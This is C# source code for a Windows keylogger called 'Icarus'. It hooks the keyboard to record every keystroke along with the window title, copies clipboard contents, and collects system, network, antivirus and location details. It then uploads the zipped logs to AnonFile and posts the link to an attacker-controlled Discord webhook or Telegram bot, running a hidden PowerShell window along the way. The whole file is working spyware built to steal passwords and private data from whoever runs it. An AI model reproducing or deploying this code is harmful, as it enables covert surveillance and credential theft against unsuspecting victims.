using AnonFileAPI;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;

namespace Keylogger
{
    public static class Program
    {

        private static int _interval = 18000;
        public static string current = Directory.GetCurrentDirectory();
        public static string CurrentPath = Application.ExecutablePath;
        public static string user = Environment.UserName;
        public static string dir = Path.Combine(Path.GetTempPath(), "Icarus");
        public static string zip = Path.Combine(Path.GetTempPath(), "Icarus.zip");
        private static bool _discord;
        private static AutoResetEvent _delayer = new AutoResetEvent(false);
        private static Dictionary<int, FileStream> _uploads = new Dictionary<int, FileStream>();
        private static Clipboard _cboard = new Clipboard();
        private static Dictionary<string, Tuple<bool, string>> _applications = new Dictionary<string, Tuple<bool, string>>();
        private static AutoResetEvent _waiter = new AutoResetEvent(false);
        private static readonly string loggerPath = Path.Combine(dir, "IcarusLog.txt");
        private static string CurrentActiveWindowTitle;
        private static bool keylogger = true;
        private static bool _telegram = true;
        private static bool clipboard = true;

        static void Main(string[] args)
        {
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }



            string title = "Icarus Logs for User:" + user;

            if (args[0].Contains("enable"))
            {

                while (true)
                {
                    _waiter.WaitOne(_interval);

                    Keysl();
                    Clipboard.GetText();

                }


            }
            else
            {
                Process[] workers = Process.GetProcessesByName("KL");
                foreach (Process worker in workers)
                {
                    worker.Kill();
                    worker.WaitForExit();
                    worker.Dispose();
                }

            }





            /*
            if (args[0].Contains("telegram"))
            {
                while (!File.Exists(loggerPath))
                {
                    Thread.Sleep(2000);
                }
                intervalT(args[0], args[1], args[2], zip);
            }
            else
            {
                while (!File.Exists(loggerPath))
                {
                    Thread.Sleep(2000);
                }
                intervalD(args[0], args[1], zip);

            }
            */

        }

        public static void Keysl()
        {
            Console.WriteLine("[!] activating logger");
            Thread t = new Thread(() =>
            {
                _hookID = SetHook(_proc);
                Application.Run();

            });

            t.SetApartmentState(ApartmentState.STA);
            t.Start();

        }
        #region INTERNAL
        private static void intervalT(string messenger, string token, string id, string file)
        {
            Thread t = new Thread(() =>
            {

                string title = "Icarus Logs for User:" + user;

                if ((_telegram))
                {

                    while (true)
                    {
                        _waiter.WaitOne(_interval);
                        var archive = Filemanager.CreateArchive(dir);
                        Console.WriteLine("[!] activating interval");
                        SendReportT(messenger, file, token, id);

                    }


                }

            });

            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }

        private static void intervalD(string messenger, string hook, string file)
        {
            Thread t = new Thread(() =>
            {

                string title = "Icarus Logs for User:" + user;

                if ((_discord))
                {

                    string toSend;

                    while (true)
                    {
                        _waiter.WaitOne(_interval);
                        var archive = Filemanager.CreateArchive(dir);
                        Console.WriteLine("[!] activating interval");
                        SendReport(messenger, file, hook);


                    }




                }

            });

            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }


        #endregion
        private const int MaxKeylogs = 45;
        private static readonly string KeylogsHistory = loggerPath;
        private static string GetKeylogsHistory()
        {
            if (!File.Exists(loggerPath))
                return "";

            var logs = File.ReadAllLines(loggerPath)
                .Reverse().Take(MaxKeylogs).Reverse().ToList();
            var len = logs.Count == 1 ? $"({logs.Count} - MAX)" : $"({logs.Count})";
            var data = string.Join("\n", logs);
            return $"\n\n  ⌨️ *Keylogger {len}:*\n" + data;
        }
        private static void UploadKeylogs()
        {
            using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
            {
                var log = dir;
                if (!Directory.Exists(log)) return;
                var filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
                var archive = Filemanager.CreateArchive(log, false);
                File.Move(archive, filename + ".zip");
                AnonFile url = anonFileWrapper.UploadFile(filename + ".zip");
                //var url = //GofileFileService.UploadFile(filename + ".zip");
                File.Delete(filename + ".zip");
                File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
                                                   $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");

            }
        }
        public static void SendReport(string messanger, string file, string hook)
        {
            string zipArchive = file;


            //UploadKeylogs();

            // Get info
            var info = "```"
                       + "\n💀 *Icarus Keylogger - Report:*"
                       + "\nDate: " + SystemInfo.Datenow
                       + "\nSystem: " + SystemInfo.GetSystemVersion()
                       + "\nUsername: " + SystemInfo.Username
                       + "\nCompName: " + SystemInfo.Compname
                       + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture
                       + "\nAntivirus: " + SystemInfo.GetAntivirus()
                       + "\n"
                       + "\n💻 *Hardware:*"
                       + "\nCPU: " + SystemInfo.GetCpuName()
                       + "\nGPU: " + SystemInfo.GetGpuName()
                       + "\nRAM: " + SystemInfo.GetRamAmount()
                       + "\nPower: " + SystemInfo.GetBattery()
                       + "\nScreen: " + SystemInfo.ScreenMetrics()
                       + "\n"
                       + "\n📡 *Network:* "
                       + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                       + "\nInternal IP: " + SystemInfo.GetLocalIp()
                       + "\nExternal IP: " + SystemInfo.GetPublicIp()
                       + "\n" + SystemInfo.GetLocation()
                       + "\n"
                       + "\nKey logs:"
                       + GetKeylogsHistory()
                       + "\n"
                       + "```";
            /*
                        var last = GetLatestMessageId();
                        if (last != "-1")
                            EditMessage(info, last, hook);
                        else
                            SetLatestMessageId(SendMessage(info, hook));
            */


            try
            {


                using (defender defcon = new defender())
                {
                    ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                    foreach (ManagementObject managementObject in mos.Get())
                    {

                        String OSName = managementObject["Caption"].ToString();
                        defcon.ProfilePicture = "https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png";
                        defcon.UserName = "ICARUS";
                        defcon.WebHook = hook;
                        using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
                        {


                            if (File.Exists(zipArchive))
                            {
                                Console.WriteLine("[!] uploading to Anonfile");
                                AnonFile cpanonFile = anonFileWrapper.UploadFile(zipArchive);
                                string cp = anonFileWrapper.GetDirectDownloadLinkFromLink(cpanonFile.FullUrl);
                                while (string.IsNullOrWhiteSpace(cp)) Thread.Sleep(5000);
                                defcon.SendMessage("```" + info + Environment.NewLine + "DOWNLOAD:🔗 " + cp + Environment.NewLine + "```");
                                Finish(); // 

                            }
                            else
                            {
                                Console.WriteLine("[!] uploading to Anonfile");
                                ZipFile.CreateFromDirectory(Program.dir, zipArchive);
                                AnonFile cpanonFile = anonFileWrapper.UploadFile(zipArchive);
                                string cp = anonFileWrapper.GetDirectDownloadLinkFromLink(cpanonFile.FullUrl);
                                while (string.IsNullOrWhiteSpace(cp)) Thread.Sleep(5000);
                                defcon.SendMessage("```" + info + Environment.NewLine + "DOWNLOAD:🔗 " + cp + Environment.NewLine + "```");
                                Finish(); // 
                            }

                        }

                    }
                }
            }
            catch
            {


            }

        }
        internal static void SendReportT(string messenger, string file, string token, string id)
        {
            string zipArchive = file;


            //UploadKeylogs();
            Console.WriteLine("[!] uploading link to telegram");
            // Get info
            var info = ""
                       + "\n💀 *Icarus Keylogger - Report:*"
                       + "\nDate: " + SystemInfo.Datenow
                       + "\nSystem: " + SystemInfo.GetSystemVersion()
                       + "\nUsername: " + SystemInfo.Username
                       + "\nCompName: " + SystemInfo.Compname
                       + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture
                       + "\nAntivirus: " + SystemInfo.GetAntivirus()
                       + "\n"
                       + "\n💻 *Hardware:*"
                       + "\nCPU: " + SystemInfo.GetCpuName()
                       + "\nGPU: " + SystemInfo.GetGpuName()
                       + "\nRAM: " + SystemInfo.GetRamAmount()
                       + "\nPower: " + SystemInfo.GetBattery()
                       + "\nScreen: " + SystemInfo.ScreenMetrics()
                       + "\n"
                       + "\n📡 *Network:* "
                       + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                       + "\nInternal IP: " + SystemInfo.GetLocalIp()
                       + "\nExternal IP: " + SystemInfo.GetPublicIp()
                       + "\n" + SystemInfo.GetLocation()
                       + "\n"
                       + "\nKey logs:"
                       + GetKeylogsHistory()
                       + "\n"
                       + "";


            try
            {


                using (defender defcon = new defender())
                {
                    ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                    foreach (ManagementObject managementObject in mos.Get())
                    {

                        String OSName = managementObject["Caption"].ToString();
                        defcon.ProfilePicture = "https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png";
                        defcon.UserName = "ICARUS";
                        using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
                        {


                            if (File.Exists(zipArchive))
                            {
                                Console.WriteLine("[!] uploading to Anonfile");
                                AnonFile cpanonFile = anonFileWrapper.UploadFile(zipArchive);
                                string cp = anonFileWrapper.GetDirectDownloadLinkFromLink(cpanonFile.FullUrl);
                                while (string.IsNullOrWhiteSpace(cp)) Thread.Sleep(5000);
                                sendMessage(token, id, info + Environment.NewLine + Environment.NewLine + "DOWNLOAD:🔗 " + cp + Environment.NewLine);
                                Finish(); // 

                            }
                            else
                            {
                                Console.WriteLine("[!] uploading to Anonfile");
                                ZipFile.CreateFromDirectory(Program.dir, zipArchive);
                                AnonFile cpanonFile = anonFileWrapper.UploadFile(zipArchive);
                                string cp = anonFileWrapper.GetDirectDownloadLinkFromLink(cpanonFile.FullUrl);
                                while (string.IsNullOrWhiteSpace(cp)) Thread.Sleep(5000);
                                sendMessage(token, id, info + Environment.NewLine + Environment.NewLine + "DOWNLOAD:🔗 " + cp + Environment.NewLine);
                                Finish(); // 
                            }

                        }

                    }
                }
            }
            catch
            {


            }


        }
        /// <summary>
        /// The sendMessage.
        /// </summary>
        /// <param name="token">The token<see cref="string"/>.</param>
        /// <param name="destID">The destID<see cref="string"/>.</param>
        /// <param name="text">The text<see cref="string"/>.</param>
        /// <returns>The <see cref="Task"/>.</returns>
        public static async Task sendMessage(string token, string destID, string text)
        {
            try
            {
                var bot = new Telegram.Bot.TelegramBotClient(token);
                await bot.SendTextMessageAsync(destID, text);
            }
            catch (Exception e)
            {
                Console.WriteLine("err");
            }
        }

        /// <summary>
        /// The Zip.
        /// </summary>
        /// <param name="dir">The dir<see cref="string"/>.</param>
        /// <param name="zipPath">The zipPath<see cref="string"/>.</param>
        public static void Zip(string dir, string zipPath) //  Works
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });
        }

        /// <summary>
        /// The Finish.
        /// </summary>
        internal static void Finish()
        {
            string temp = Path.GetTempPath();
            string zipArchive = Path.Combine(temp, "ICARUS.zip");
            Thread.Sleep(15000);
            //Directory.Delete(Help.ExploitDir + "\\", true);
            //File.Delete(zipArchive);
            Environment.Exit(0);
        }
        internal class Clipboard
        {
            [DllImport("user32.dll")]
            private static extern bool IsClipboardFormatAvailable(uint format);

            [DllImport("user32.dll", SetLastError = true)]
            private static extern bool OpenClipboard(IntPtr hWndNewOwner);

            [DllImport("user32.dll")]
            private static extern IntPtr GetClipboardData(uint uFormat);

            [DllImport("kernel32.dll")]
            private static extern IntPtr GlobalLock(IntPtr hMem);

            [DllImport("kernel32.dll")]
            private static extern bool GlobalUnlock(IntPtr hMem);

            [DllImport("user32.dll", SetLastError = true)]
            private static extern bool CloseClipboard();

            public static string GetText()
            {
                string str = Program.dir + "\\";
                if (Clipboard.IsClipboardFormatAvailable(13U) && Clipboard.OpenClipboard(IntPtr.Zero))
                {
                    string contents = string.Empty;
                    IntPtr clipboardData = Clipboard.GetClipboardData(13U);
                    if (!clipboardData.Equals((object)IntPtr.Zero))
                    {
                        IntPtr num = Clipboard.GlobalLock(clipboardData);
                        if (!num.Equals((object)IntPtr.Zero))
                        {
                            try
                            {
                                contents = Marshal.PtrToStringUni(num);
                                Clipboard.GlobalUnlock(num);
                            }
                            catch
                            {
                            }
                        }
                    }
                    Clipboard.CloseClipboard();
                    File.WriteAllText(str + "Clipboard.txt", contents);
                }
                return (string)null;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                string currentKey = KeyboardLayout((uint)vkCode);

                if (capsLock || shiftPress)
                {
                    currentKey = currentKey.ToUpper();
                }
                else
                {
                    currentKey = currentKey.ToLower();
                }

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "[" + (Keys)vkCode + "]";

                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = "[SPACE]";
                            break;
                        case "Return":
                            currentKey = "[ENTER]";
                            break;
                        case "Escape":
                            currentKey = "[ESC]";
                            break;
                        case "LControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "LShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "Back":
                            currentKey = "[Back]";
                            break;
                        case "LWin":
                            currentKey = "[WIN]";
                            break;
                        case "Tab":
                            currentKey = "[Tab]";
                            break;
                        case "Capital":
                            if (capsLock == true)
                                currentKey = "[CAPSLOCK: OFF]";
                            else
                                currentKey = "[CAPSLOCK: ON]";
                            break;
                    }
                }

                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                {
                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                    {
                        sw.Write(currentKey);
                    }
                    else
                    {
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
                        sw.Write(currentKey);
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.ProcessName;
                CurrentActiveWindowTitle = title;
                return title;
            }
            catch (Exception)
            {
                return "???";
            }
        }


        #region "Hooks & Native Methods"
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        #endregion
    }
}